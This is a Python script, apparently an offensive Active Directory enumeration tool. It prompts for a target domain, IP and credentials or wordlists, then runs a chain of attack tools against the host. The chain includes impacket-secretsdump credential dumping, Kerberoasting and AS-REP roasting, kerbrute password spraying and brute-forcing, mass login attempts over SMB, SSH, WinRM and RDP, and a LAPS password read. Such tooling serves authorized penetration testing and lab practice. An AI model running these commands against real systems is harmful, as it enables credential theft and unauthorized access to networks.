#!/usr/bin/python3
import argparse
import subprocess
import sys
from datetime import datetime
import os
import time
import threading

def rgb_to_ansi(hex_color):
    # Convert hex color to RGB
    hex_color = hex_color.lstrip('#')
    r = int(hex_color[0:2], 16)
    g = int(hex_color[2:4], 16)
    b = int(hex_color[4:6], 16)
    return f"\033[38;2;{r};{g};{b}m"

def print_title():
    # Pink color (F686BD)
    pink = rgb_to_ansi("F686BD")
    reset = "\033[0m"
    
    title = f"""{pink}
 _,   _            __,                             
( |  /            (    _/_          o    /         
  | /_  _   __  ,  `.  /  , ,  ,_  ,  __/          
  |/(/_/ (_/ (_/_(___)(__(_/__/|_)_(_(_/_          
              /               /|                   
             '               (/                    
 ______                                            
(  /                                  _/_o         
  /--   _ _   , , _ _ _   _  _   __,  / ,  __ _ _  
(/____// / /_(_/_/ / / /_(/_/ (_(_/(_(__(_(_)/ / /_
{reset}"""
    print(title)
    print("\n" + "="*60)
    print(" "*20 + "Starting Enumeration...")
    print("="*60 + "\n")

def setup_logging(ip):
    """Setup logging file"""
    log_file = f"verystupid_{ip}.txt"
    return log_file

def log_command(log_file, command, output):
    """Log command and its output to file"""
    with open(log_file, 'a') as f:
        f.write(f"\n{'='*50}\n")
        f.write(f"Command: {command}\n")
        f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"{'='*50}\n")
        f.write(output)
        f.write("\n")

def prompt_for_input():
    pink = rgb_to_ansi("F686BD")
    reset = "\033[0m"
    print(f"\n{pink}[*] Hey dingus, please provide the following information:{reset}")
    
    # Required inputs
    domain = input(f"{pink}Domain (required): {reset}").strip()
    while not domain:
        print(f"{pink}Domain is required!{reset}")
        domain = input(f"{pink}Domain (required): {reset}").strip()
    
    ip = input(f"{pink}IP Address (required): {reset}").strip()
    while not ip:
        print(f"{pink}IP Address is required!{reset}")
        ip = input(f"{pink}IP Address (required): {reset}").strip()
    
    # Optional DC-IP
    dc_ip = input(f"{pink}DC-IP (optional, press Enter to skip): {reset}").strip()
    
    # User authentication
    print(f"\n{pink}User Authentication (choose one idiot):{reset}")
    print(f"{pink}1. Single username{reset}")
    print(f"{pink}2. User list file{reset}")
    user_choice = input(f"{pink}Enter choice (1/2): {reset}").strip()
    
    username = None
    userlist = None
    while user_choice not in ['1', '2']:
        user_choice = input(f"{pink}Please enter 1 or 2: {reset}").strip()
    
    if user_choice == '1':
        username = input(f"{pink}Username: {reset}").strip()
        while not username:
            username = input(f"{pink}Username cannot be empty: {reset}").strip()
    else:
        userlist = input(f"{pink}Path to user list file: {reset}").strip()
        while not userlist or not os.path.exists(userlist):
            userlist = input(f"{pink}Please enter a valid file path: {reset}").strip()
    
    # Password authentication
    print(f"\n{pink}Password Authentication (pick one dummy):{reset}")
    print(f"{pink}1. Single password{reset}")
    print(f"{pink}2. Password list file{reset}")
    pass_choice = input(f"{pink}Enter choice (1/2): {reset}").strip()
    
    password = None
    passwordlist = None
    while pass_choice not in ['1', '2']:
        pass_choice = input(f"{pink}Please enter 1 or 2: {reset}").strip()
    
    if pass_choice == '1':
        password = input(f"{pink}Password: {reset}").strip()
        while not password:
            password = input(f"{pink}Password cannot be empty: {reset}").strip()
    else:
        passwordlist = input(f"{pink}Path to password list file: {reset}").strip()
        while not passwordlist or not os.path.exists(passwordlist):
            passwordlist = input(f"{pink}Please enter a valid file path: {reset}").strip()
    
    return {
        'domain': domain,
        'ip': ip,
        'dc_ip': dc_ip,
        'username': username,
        'userlist': userlist,
        'password': password,
        'passwordlist': passwordlist
    }

def run_commands(commands, log_file):
    """Execute multiple commands and log output"""
    pink = rgb_to_ansi("F686BD")
    reset = "\033[0m"
    
    for command in commands:
        try:
            print(f"\n{pink}[*] Running: {reset}{command}")
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            output, error = process.communicate()
            
            # Combine stdout and stderr for logging
            full_output = output + error
            log_command(log_file, command, full_output)
            
            print(f"{pink}[+] Command completed.{reset}")
        except Exception as e:
            print(f"{pink}[-] Error executing command: {reset}{e}")
            log_command(log_file, command, f"Error: {str(e)}")
            continue

def get_scenario_1_commands(inputs):
    """Commands for single username and password"""
    return [
        f"bloodhound-python -u {inputs['username']} -p '{inputs['password']}' -ns {inputs['ip']} -d {inputs['domain']} -c all",
        f"enum4linux -u \"{inputs['username']}\" -p \"{inputs['password']}\" -a {inputs['ip']}",
        f"impacket-secretsdump {inputs['domain']}/{inputs['username']}:'{inputs['password']}'@{inputs['ip']}",
        f"impacket-GetUserSPNs {inputs['domain']}/{inputs['username']}:'{inputs['password']}' -dc-ip {inputs['dc_ip'] or inputs['ip']}",
        f"impacket-GetNPUsers {inputs['domain']}/{inputs['username']}:'{inputs['password']}' -dc-ip {inputs['dc_ip'] or inputs['ip']}",
        f"impacket-rpcdump {inputs['domain']}/{inputs['username']}:{inputs['password']}@{inputs['ip']}",
        f"ldapdomaindump -u {inputs['domain']}\\\\{inputs['username']} -p '{inputs['password']}' {inputs['domain']} -o ldapdomaindump",
        f"nxc ldap {inputs['ip']} -u {inputs['username']} -p {inputs['password']} --kdcHost {inputs['ip']} -M laps",
        f"nxc smb {inputs['ip']} -u {inputs['username']} -p '{inputs['password']}' -d {inputs['domain']}",
        f"nxc ssh {inputs['ip']} -u {inputs['username']} -p '{inputs['password']}' -d {inputs['domain']}",
        f"nxc winrm {inputs['ip']} -u {inputs['username']} -p '{inputs['password']}' -d {inputs['domain']}",
        f"nxc rdp {inputs['ip']} -u {inputs['username']} -p '{inputs['password']}' -d {inputs['domain']} --rdp-timeout 30",
        f"smbclient -L //{inputs['ip']}/ -U {inputs['username']}%{inputs['password']}"
    ]

def get_scenario_2_commands(inputs):
    """Commands for single username with password list"""
    return [
        f"enum4linux -a {inputs['ip']}",
        f"kerbrute bruteuser -d {inputs['domain']} {inputs['passwordlist']} {inputs['username']}",
        f"ldapsearch -LLL -x -H ldap://{inputs['domain']} -b'' -s base '(objectclass=*)'",
        f"nxc smb {inputs['ip']} -u {inputs['username']} -p {inputs['passwordlist']} -d {inputs['domain']} --continue-on-success",
        f"nxc ssh {inputs['ip']} -u {inputs['username']} -p {inputs['passwordlist']} -d {inputs['domain']} --continue-on-success",
        f"nxc winrm {inputs['ip']} -u {inputs['username']} -p {inputs['passwordlist']} -d {inputs['domain']} --continue-on-success",
        f"nxc rdp {inputs['ip']} -u {inputs['username']} -p {inputs['passwordlist']} -d {inputs['domain']} --continue-on-success --rdp-timeout 30",
        f"smbclient -L \\\\\\\\{inputs['ip']}\\\\ -u '{inputs['username']}' -p ''"
    ]

def get_scenario_3_commands(inputs):
    """Commands for user list with single password"""
    return [
        f"enum4linux -a {inputs['ip']}",
        f"kerbrute passwordspray -d {inputs['domain']} {inputs['userlist']} {inputs['password']}",
        f"kerbrute userenum -d {inputs['domain']} {inputs['userlist']}",
        f"ldapsearch -LLL -x -H ldap://{inputs['domain']} -b'' -s base '(objectclass=*)'",
        f"nxc smb {inputs['ip']} -u {inputs['userlist']} -p '{inputs['password']}' -d {inputs['domain']} --continue-on-success",
        f"nxc ssh {inputs['ip']} -u {inputs['userlist']} -p '{inputs['password']}' -d {inputs['domain']} --continue-on-success",
        f"nxc winrm {inputs['ip']} -u {inputs['userlist']} -p '{inputs['password']}' -d {inputs['domain']} --continue-on-success",
        f"nxc rdp {inputs['ip']} -u {inputs['userlist']} -p '{inputs['password']}' -d {inputs['domain']} --continue-on-success --rdp-timeout 30",
        f"smbclient -L \\\\\\\\{inputs['ip']}\\\\ -N"
    ]

def get_scenario_4_commands(inputs):
    """Commands for user list and password list"""
    return [
        f"enum4linux -a {inputs['ip']}",
        f"kerbrute userenum -d {inputs['domain']} {inputs['userlist']}",
        f"ldapsearch -LLL -x -H ldap://{inputs['domain']} -b'' -s base '(objectclass=*)'",
        f"nxc smb {inputs['ip']} -u '' -p '' --shares --users",
        f"nxc ssh {inputs['ip']} -u {inputs['userlist']} -p {inputs['passwordlist']}",
        f"nxc winrm {inputs['ip']} -u {inputs['userlist']} -p {inputs['passwordlist']}",
        f"nxc rdp {inputs['ip']} -u {inputs['userlist']} -p {inputs['passwordlist']} --rdp-timeout 30",
        f"smbclient -L \\\\\\\\{inputs['ip']}\\\\ -N"
    ]

def main():
    print_title()
    inputs = prompt_for_input()
    
    # Setup logging
    log_file = setup_logging(inputs['ip'])
    pink = rgb_to_ansi("F686BD")
    reset = "\033[0m"
    print(f"\n{pink}[*] Starting enumeration. Log file: {reset}{log_file}")
    
    # Setup animation stop event
    #stop_animation = threading.Event()
    
    # Determine scenario and run appropriate commands
# Determine scenario and run appropriate commands
    if inputs['username'] and inputs['password']:
        commands = get_scenario_1_commands(inputs)
        print(f"\n{pink}[*] Running Scenario 1: Single username and password{reset}")
        
    elif inputs['username'] and inputs['passwordlist']:
        commands = get_scenario_2_commands(inputs)
        print(f"\n{pink}[*] Running Scenario 2: Single username with password list{reset}")
        
    elif inputs['userlist'] and inputs['password']:
        commands = get_scenario_3_commands(inputs)
        print(f"\n{pink}[*] Running Scenario 3: User list with single password{reset}")
        
    elif inputs['userlist'] and inputs['passwordlist']:
        commands = get_scenario_4_commands(inputs)
        print(f"\n{pink}[*] Running Scenario 4: No creds{reset}")

    run_commands(commands, log_file)
    print(f"\n{pink}[*] Enumeration completed!{reset}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Script terminated by user")
        sys.exit(0)
